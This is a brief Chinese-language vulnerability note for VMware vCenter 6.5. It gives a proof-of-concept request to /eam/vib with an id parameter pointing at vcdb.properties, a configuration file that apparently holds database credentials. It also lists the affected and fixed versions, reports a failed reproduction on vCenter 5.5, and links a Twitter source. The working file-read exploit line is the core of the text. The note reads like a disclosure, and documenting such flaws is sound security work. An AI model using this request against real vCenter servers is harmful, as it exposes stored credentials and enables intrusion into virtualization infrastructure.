POC:  
/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties

已知影响版本：VMware vCenter 6.5.0a-f  
安全版本：VMware vCenter 6.5.0u1

有人提到：vCenter 5.5+Windows Server 2012下复现失败

参考链接：  
https://twitter.com/ptswarm/status/1316016337550938122
